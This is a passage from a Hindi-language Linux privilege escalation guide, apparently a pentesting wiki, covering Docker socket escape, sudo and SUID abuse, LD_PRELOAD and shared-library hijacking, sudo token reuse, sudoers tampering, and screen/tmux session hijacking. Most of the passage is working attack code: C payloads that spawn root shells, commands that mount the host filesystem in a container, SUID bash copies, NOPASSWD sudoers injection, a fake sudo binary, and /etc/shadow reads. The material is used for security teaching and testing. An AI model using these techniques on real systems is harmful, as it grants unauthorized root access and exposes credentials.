curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से connection स्थापित करें, जिससे उसके अंदर command execution संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection सेट करने के बाद, आप container में सीधे कमांड execute कर सकते हैं, जिनके पास host की filesystem पर root-level access होगा।

### अन्य

ध्यान दें कि अगर आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

जाँच करें **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** command का उपयोग कर सकते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) सिस्टम है जो applications को प्रभावी ढंग से आपस में interact और data share करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह अलग-अलग प्रकार के application communication के लिए एक मजबूत framework प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो processes के बीच data विनिमय को बढ़ाता है, और यह enhanced UNIX domain sockets जैसी कार्यक्षमता का विकल्प प्रदान करता है। इसके अलावा, यह events या signals के प्रसारण में मदद करता है, जिससे system components के बीच seamless integration संभव होता है। उदाहरण के लिए, Bluetooth daemon से आने वाला एक signal किसी music player को mute करने के लिए प्रेरित कर सकता है, जिससे user अनुभव बेहतर होता है। साथ ही, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, और पारंपरिक रूप से जटिल प्रक्रियाओं को सहज बनाता है।

D-Bus एक allow/deny मॉडल पर काम करता है, जो policy rules के cumulative प्रभाव के आधार पर message permissions (method calls, signal emissions, आदि) का प्रबंधन करता है। ये policies bus के साथ इंटरैक्शनों को निर्दिष्ट करती हैं, और इन permissions के दुरुपयोग के माध्यम से privilege escalation संभव हो सकती है।

`/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी एक policy का उदाहरण दिया गया है, जो root user को `fi.w1.wpa_supplicant1` का मालिक होने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions का विवरण देती है।

यदि किसी नीति में user या group निर्दिष्ट नहीं है तो वह सार्वभौमिक रूप से लागू होती है, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं होते।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

यह हमेशा दिलचस्प होता है कि नेटवर्क को enumerate करके मशीन की स्थिति का पता लगाया जाए।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उस मशीन पर चल रहे network services की जाँच करें जिनके साथ आप मशीन तक पहुँचने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

यह जांचें कि क्या आप sniff traffic कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य Enumeration

जाँचें कि आप **कौन** हैं, आपके पास कौन से **privileges** हैं, सिस्टमों में कौन से **users** हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो उन उपयोगकर्ताओं को जिनका **UID > INT_MAX** है, escalate privileges करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

जांचें कि क्या आप किसी ऐसे समूह के **सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

यदि संभव हो तो जांचें कि क्लिपबोर्ड में कुछ रोचक मौजूद है या नहीं
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **किसी भी पासवर्ड** को जानते हैं तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने** का प्रयास करें।

### Su Brute

यदि आपको बहुत शोर करने से आपत्ति नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force आज़मा सकते हैं.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप privileges escalate कर सकते हैं **लिखने योग्य फ़ोल्डर के अंदर एक backdoor बनाकर** जिसका नाम किसी ऐसे command जैसा हो जिसे किसी दूसरे user (आदर्श रूप से root) द्वारा execute किया जाएगा और जो **$PATH में आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से लोड नहीं होता**।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ कमांड चलाने की अनुमति मिल सकती है, या उन पर suid बिट सेट हो सकता है। इसे जाँचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनअपेक्षित commands आपको files पढ़ने और/या लिखने या यहाँ तक कि command execute करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी user को बिना password जाने, किसी अन्य user के privileges के साथ कोई command चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब root directory में एक ssh key जोड़कर या `sh` को कॉल करके shell पाना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **PYTHONPATH hijacking** के लिए **असुरक्षित** था, ताकि script को root के रूप में चलाते समय किसी भी मनमाने python library को लोड किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के माध्यम से संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup व्यवहार का उपयोग करके किसी अनुमत कमांड को invoke करते समय arbitrary कोड को root के रूप में चला सकते हैं।

- Why it works: non-interactive shells के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और target script चलाने से पहले उस फ़ाइल को source करता है। कई sudo rules स्क्रिप्ट या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source की जाएगी।

- आवश्यकताएँ:
- ऐसी कोई sudo rule जो आप चला सकें (कोई भी target जो non-interactively `/bin/bash` को invoke करता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जांचने के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ — `env_reset` को प्राथमिकता दें।
- shell wrappers वाले sudo-allowed commands से बचें; minimal binaries का उपयोग करें।
- preserved env vars के उपयोग होने पर sudo I/O logging और alerting पर विचार करें।

### Sudo execution bypassing paths

**Jump** अन्य फाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग (\*) किया जाता है, तो यह और भी आसान हो जाता है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary जब command path निर्दिष्ट न किया गया हो

यदि **sudo permission** किसी एक कमांड को **बिना path निर्दिष्ट किए** दिया गया है: _hacker10 ALL= (root) less_ तो आप PATH वेरिएबल बदलकर इसका शोषण कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है यदि एक **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary जिसमें command का path दिया हुआ हो

यदि **suid** binary **executes another command specifying the path**, तो आप उस command के नाम से एक function export करने की कोशिश कर सकते हैं जो suid file कॉल कर रही है।

उदाहरण के लिए, यदि एक suid binary _**/usr/sbin/service apache2 start**_ को call करता है, तो आपको उस नाम का function बनाकर उसे export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस फीचर के दुरुपयोग को रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** की परवाह नहीं करता जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल वही libraries preload की जाती हैं जो standard paths में हैं और जो खुद भी suid/sgid हैं।

Privilege escalation हो सकता है यदि आपके पास `sudo` के साथ commands execute करने की क्षमता है और `sudo -l` का आउटपुट **env_keep+=LD_PRELOAD** कथन शामिल करता है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बनाए रहने और `sudo` के साथ commands चलाने पर भी मान्य होने की अनुमति देता है, जिससे संभावित रूप से arbitrary code elevated privileges के साथ executed हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है तो समान privesc का दुरुपयोग किया जा सकता है क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी असामान्य दिखने वाले binary में **SUID** permissions मिलें, तो यह जाँचना अच्छा अभ्यास है कि वह **.so** फाइलें सही तरीके से लोड कर रहा है या नहीं। इसे नीचे दिए गए कमांड को चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर यह exploitation की संभावना का संकेत देता है।

इसे exploit करने के लिए, आप एक C file बनाएँगे, उदाहरण के लिए _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को निम्न कमांड से shared object (.so) फाइल में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने पर exploit ट्रिगर होनी चाहिए, जिससे संभावित सिस्टम समझौता हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पा लिया है जो उस folder से एक library लोड कर रहा है जिसमें हम write कर सकते हैं, तो आइए उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिन्हें attacker द्वारा local security restrictions को bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है पर उन मामलों के लिए जहाँ आप किसी command में **only inject arguments** कर सकते हैं।

The project Unix binaries के legitimate functions को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, escalate या maintain elevated privileges करने, files transfer करने, bind और reverse shells spawn करने, और अन्य post-exploitation tasks को आसान बनाने के लिए abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` को access कर सकते हैं तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर यह चेक कर सकते हैं कि यह किसी sudo rule को exploit करने का तरीका ढूँढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** तो है पर password नहीं है, आप **sudo command execution का इंतज़ार करके और फिर session token को hijack करके** privileges escalate कर सकते हैं।

Requirements to escalate privileges:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **used `sudo`** करके कुछ execute किया हुआ होना चाहिए **last 15mins** में (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें बिना password के `sudo` इस्तेमाल करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 होना चाहिए
- gdb accessible होना चाहिए (आप इसे upload कर सकते हैं)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व वाला और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को स्थायी बनाता है और सभी users को sudo उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में एक shell है जिसका PID 1234 है, तो आप पासवर्ड जाने बिना **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे।  
**ये फ़ाइलें डिफ़ॉल्ट रूप से केवल उपयोगकर्ता root और समूह root द्वारा पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप कुछ रोचक जानकारी **प्राप्त** कर सकते हैं, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** करने में सक्षम होंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas` — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` में जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आपको पता है कि कोई **उपयोगकर्ता सामान्यतः किसी मशीन से कनेक्ट होकर और `sudo` का उपयोग करके** अधिकार बढ़ाता है और आपने उस उपयोगकर्ता संदर्भ में एक shell प्राप्त कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपके कोड को root के रूप में चलाएगा और फिर उपयोगकर्ता की कमांड को चलाएगा। फिर, उपयोगकर्ता संदर्भ के **$PATH** को संशोधित करें (उदाहरण के लिए नई path को .bash_profile में जोड़कर) ताकि जब उपयोगकर्ता sudo चलाए, तो आपका sudo executable चलाया जाए।

ध्यान दें कि यदि उपयोगकर्ता किसी अलग shell (bash नहीं) का उपयोग करता है तो नई path जोड़ने के लिए आपको अन्य फाइलें संशोधित करनी पड़ेंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

Or running something like:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **कि लोड की गई configuration फ़ाइलें कहां से हैं**। आमतौर पर, इस फ़ाइल में निम्न path शामिल होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से configuration फ़ाइलें पढ़ी जाएँगी। ये configuration फ़ाइलें अन्य फ़ोल्डरों की ओर **इशारा** करती हैं जहाँ **libraries** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर libraries की खोज करेगा**।

यदि किसी कारणवश **किसी user के पास write permissions** इन में से किसी path पर हैं: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर config फ़ाइल में दिए किसी भी फ़ोल्डर पर, तो वह privileges escalate कर सकता है.\
इस misconfiguration का exploit कैसे किया जाए, यह निम्नलिखित पृष्ठ में देखें:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर प्रोग्राम द्वारा यह उसी स्थान से उपयोग किया जाएगा, जैसा `RPATH` variable में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक evil library बनाएं और इसके लिए `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करें।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी प्रक्रिया को उपलब्ध **root privileges का subset** प्रदान करते हैं। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट इकाइयों में विभाजित कर देता है**। इनमें से प्रत्येक इकाई को स्वतंत्र रूप से प्रक्रियाओं को प्रदान किया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## निर्देशिका अनुमतियाँ

एक निर्देशिका में, the **bit for "execute"** यह बताता है कि प्रभावित उपयोगकर्ता फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** bit का मतलब है कि उपयोगकर्ता **list** कर सकता है **files**, और **"write"** bit का मतलब है कि उपयोगकर्ता **delete** और **create** नई **files** कर सकता है।

## ACLs

Access Control Lists (ACLs) स्वैच्छिक अनुमतियों की द्वितीयक परत हैं, जो पारंपरिक ugo/rwx अनुमतियों को **overriding the traditional ugo/rwx permissions** में सक्षम हैं। ये permissions फ़ाइल या निर्देशिका के access पर नियंत्रण बढ़ाती हैं क्योंकि ये उन विशिष्ट उपयोगकर्ताओं को अधिकार देने या अस्वीकार करने की अनुमति देती हैं जो मालिक नहीं हैं या समूह का हिस्सा नहीं हैं। यह स्तर **granularity ensures more precise access management** प्रदान करता है। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले **shell** सत्र

**पुराने संस्करणों** में आप किसी अलग उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल अपने ही उपयोगकर्ता के **screen sessions** से ही **connect** कर पाएँगे। हालाँकि, आप **session के अंदर दिलचस्प जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**एक session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions सूची करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितम्बर 2006 और 13 मई, 2008 के बीच Debian आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर बनाए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं।\
